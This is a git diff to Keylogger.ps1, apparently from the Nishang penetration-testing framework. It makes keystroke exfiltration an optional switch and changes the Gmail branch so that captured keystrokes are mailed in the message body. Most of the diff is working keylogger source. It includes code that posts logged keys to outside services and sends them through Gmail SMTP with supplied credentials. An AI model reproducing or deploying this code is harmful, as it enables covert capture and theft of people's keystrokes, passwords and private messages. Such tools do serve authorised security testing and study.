@@ -43,7 +43,11 @@ PS > .\Keylogger.ps1
 The payload will ask for all required options.
 
 .EXAMPLE
-PS > .\Keylogger.ps1 <dev_key> <username> <pass> 3 http://example.com stopthis
+PS > .\Keylogger.ps1 http://example.com stopthis
+Use above when using the payload from non-interactive shells and no exfiltration is required.
+
+.EXAMPLE
+PS > .\Keylogger.ps1 http://example.com stopthis -exfil <dev_key> <username> <pass> 3 
 Use above when using the payload from non-interactive shells or you don't want the payload to ask for any options.
 
 
@@ -57,14 +61,16 @@ http://labofapenetrationtester.blogspot.com/
 http://code.google.com/p/nishang
 #>
 
-
+[CmdletBinding(DefaultParameterSetName="noexfil")]
 Param( [Parameter()] [Switch] $persist,
-[Parameter(Position = 0, Mandatory = $True)] [String]$dev_key,
-[Parameter(Position = 1, Mandatory = $True)] [String]$username,
-[Parameter(Position = 2, Mandatory = $True)] [String]$password,
-[Parameter(Position = 3, Mandatory = $True)] [String]$keyoutoption,
-[Parameter(Position = 4, Mandatory = $True)] [String]$MagicString,
-[Parameter(Position = 5, Mandatory = $True)] [String]$CheckURL)
+[Parameter(Parametersetname="exfil")] [Switch] $exfil,
+[Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String]$CheckURL,
+[Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$MagicString,
+[Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
+[Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [String]$username,
+[Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")] [String]$password,
+[Parameter(Position = 5, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
+
 
 
 $functions =  {
@@ -153,6 +159,7 @@ function Keylogger
             {
                 break
             }
+            $check = 0
         }
     }
 }
@@ -165,9 +172,6 @@ function Keypaste
     [Parameter(Position = 3, Mandatory = $True)] [String]$password,
     [Parameter(Position = 4, Mandatory = $True)] [String]$MagicString,
     [Parameter(Position = 5, Mandatory = $True)] [String]$CheckURL)
-    $dev_key
-    $username
-    $password
     $check = 0
     while($true) 
     { 
@@ -183,7 +187,6 @@ function Keypaste
         $now = Get-Date; 
         $name = $env:COMPUTERNAME 
         $paste_name = $name + " : " + $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff")
-        $session_key 
         Function Post_http($url,$parameters) 
         { 
             $http_request = New-Object -ComObject Msxml2.XMLHTTP 
@@ -214,19 +217,23 @@ function Keypaste
         elseif ($keyoutoption -eq "2")
         {
             #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
-            $filename = "$env:TEMP\key.log"
+            #Code for attachement is commented out. The file lock is not being release even after using Dispose()
+            #That code is left intentionally so that a user may try/fix it.
+
+            #$filename = "$env:TEMP\key.log"
             $smtpserver = “smtp.gmail.com”
             $msg = new-object Net.Mail.MailMessage
-            $att = new-object Net.Mail.Attachment($filename)
+            #$att = new-object Net.Mail.Attachment($filename)
             $smtp = new-object Net.Mail.SmtpClient($smtpServer )
             $smtp.EnableSsl = $True
             $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
             $msg.From = “$username@gmail.com”
             $msg.To.Add(”$username@gmail.com”)
             $msg.Subject = $paste_name
-            $msg.Body = “New keys have arrived. Check the attachment.”
-            $msg.Attachments.Add($att)
-            $smtp.Send($msg)
+            $msg.Body = $pastevalue
+            #$msg.Attachments.Add($att)
+            $smtp.Send($msg)     
+            #$att.Dispose()      
         }
 
         elseif ($keyoutoption -eq "3")
@@ -273,7 +280,13 @@ function Keypaste
 
     else
     {
-        start-job -InitializationScript $functions -scriptblock {Keypaste $args[0] $args[1] $args[2] $args[3] $args[4] $args[5]} -ArgumentList @($keyoutoption,$dev_key,$username,$password,$MagicString,$CheckURL)
-        start-job -InitializationScript $functions -scriptblock {Keylogger $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)
+        if ($exfil -eq $True)
+        {
+            start-job -InitializationScript $functions -scriptblock {Keypaste $args[0] $args[1] $args[2] $args[3] $args[4] $args[5]} -ArgumentList @($keyoutoption,$dev_key,$username,$password,$MagicString,$CheckURL)
+            start-job -InitializationScript $functions -scriptblock {Keylogger $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)
+        }
+        else
+        {
+            Keylogger $MagicString $CheckURL
+        }
     }
-
